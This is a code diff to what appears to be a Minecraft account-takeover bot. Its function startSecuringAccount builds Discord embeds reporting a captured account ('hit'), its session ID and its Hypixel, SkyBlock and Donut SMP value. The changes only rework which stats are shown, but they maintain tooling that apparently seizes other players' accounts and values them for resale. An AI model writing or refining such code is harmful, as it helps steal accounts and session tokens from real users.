@@ -57,11 +57,11 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     # Stats
     stats_embed = Embed(color=0x279CF5)
     stats_embed.add_field(name="Rank", value=f'{hstats["rank"]}', inline=True)
-    stats_embed.add_field(name="NWL", value=f'{simplify(hstats["networth"])}', inline=True)
+    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats["level"])}', inline=True)
     stats_embed.add_field(name="Gifted", value=f'{hstats["gifted"]}', inline=True)
-    stats_embed.add_field(name="Value", value=f'${simplify(dstats["result"]["money"])}', inline=True)
-    stats_embed.add_field(name="NW", value=f'{simplify(hstats["hlevel"])}', inline=True)
-    stats_embed.add_field(name="LVL", value=f'{hstats["slevel"]}', inline=True)
+    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats["networth"])}', inline=True)
+    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["slevel"])}', inline=True)
+    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats != "Failed" else 0}', inline=True)
 
     # Account Embed
     hit_embed = Embed(
@@ -86,13 +86,11 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     )
     
     if account["SSID"]:
-        mcEmbed = Embed()        
         hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(account['name'])}/128")
 
     accountData = {
         "hit_embed": hit_embed,
         "details": {
-            "minecraft_embed": mcEmbed,
             "stats_embed": stats_embed,
             "ssid_embed": ssid_embed,
             "info_embed": info_embed,
